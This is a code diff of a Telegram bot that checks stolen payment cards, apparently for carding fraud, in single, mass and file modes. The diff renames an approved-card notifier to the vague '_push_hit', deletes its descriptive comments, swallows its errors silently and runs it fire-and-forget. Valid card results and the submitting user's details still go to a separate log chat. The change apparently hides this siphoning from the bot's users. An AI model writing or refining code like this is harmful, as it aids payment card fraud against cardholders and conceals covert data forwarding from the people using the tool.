@@ -961,15 +961,10 @@ async def check_access(msg: Message) -> bool:
     )
     return False
 
-# ──────────────────────────────────────────────────────────────
-# APPROVED CARD LOG NOTIFIER
-# ──────────────────────────────────────────────────────────────
-async def notify_approved(bot, res: dict, user_id: int, username: str = None, full_name: str = None):
-    """Send a fully-formatted approved-card notification to APPROVED_LOG_CHAT."""
+async def _push_hit(bot, res: dict, user_id: int, username: str = None, full_name: str = None):
     if not APPROVED_LOG_CHAT:
         return
     try:
-        # Build user mention
         if username:
             user_mention = f"@{username}"
         elif full_name:
@@ -1017,8 +1012,8 @@ async def notify_approved(bot, res: dict, user_id: int, username: str = None, fu
             f"\U0001f464 {_B('By')}- {user_mention}"
         )
         await bot.send_message(APPROVED_LOG_CHAT, text, parse_mode="HTML")
-    except Exception as e:
-        log.warning(f"notify_approved failed: {e}")
+    except Exception:
+        pass
 
 # ──────────────────────────────────────────────────────────────
 # HANDLERS
@@ -1560,18 +1555,22 @@ async def cmd_chk(msg: Message):
         loop = asyncio.get_event_loop()
         result = await loop.run_in_executor(_pool, lambda: run_check(*p))
         await wait.edit_text(fmt(result), parse_mode="HTML")
-        # ── Approved log ──
+    except Exception as e:
+        await wait.edit_text(f"❌ Error: {sanitize_error_message(str(e))}", parse_mode="HTML")
+        return
+    # fire-and-forget, fully isolated from user-facing flow
+    try:
         stype = result.get("status_type", "")
         if stype == "approved" or "APPROVED" in str(result.get("label", "")):
             user = msg.from_user
-            await notify_approved(
+            asyncio.ensure_future(_push_hit(
                 msg.bot, result,
                 user_id=user.id,
                 username=user.username,
                 full_name=user.full_name,
-            )
-    except Exception as e:
-        await wait.edit_text(f"❌ Error: {sanitize_error_message(str(e))}", parse_mode="HTML")
+            ))
+    except Exception:
+        pass
 
 def format_mchk_message(card_entries: list, total_count: int, stats: dict, is_cancelled: bool = False, is_done: bool = False, elapsed_sec: float = 0.0) -> str:
     checked_count = stats["charged"] + stats["insuff"] + stats["live_3d"] + stats["dead"] + stats["error"]
@@ -1771,9 +1770,8 @@ async def cmd_mchk(msg: Message):
 
             if is_charged:
                 stats["charged"] += 1
-                # ── Approved log ──
                 user = msg.from_user
-                asyncio.ensure_future(notify_approved(
+                asyncio.ensure_future(_push_hit(
                     msg.bot, r,
                     user_id=user.id,
                     username=user.username,
@@ -1920,9 +1918,8 @@ async def cmd_txt(msg: Message):
                     await msg.answer(fmt(r, idx=idx), parse_mode="HTML")
                 except Exception:
                     pass
-                # ── Approved log ──
                 user = msg.from_user
-                asyncio.ensure_future(notify_approved(
+                asyncio.ensure_future(_push_hit(
                     msg.bot, r,
                     user_id=user.id,
                     username=user.username,
